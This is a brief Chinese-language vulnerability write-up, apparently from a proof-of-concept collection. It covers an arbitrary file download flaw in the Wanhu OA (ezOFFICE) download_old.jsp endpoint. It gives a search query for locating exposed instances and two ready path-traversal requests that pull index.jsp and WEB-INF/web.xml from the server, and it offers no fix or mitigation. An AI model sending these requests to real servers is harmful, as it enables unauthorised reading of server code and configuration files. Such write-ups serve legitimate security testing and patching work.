# 万户OA download_old.jsp 任意文件下载漏洞

## 漏洞描述

万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![image-20220520132657470](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112732906.png)

验证POC

```
/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp
/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
```

![image-20220520132715066](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112732907.png)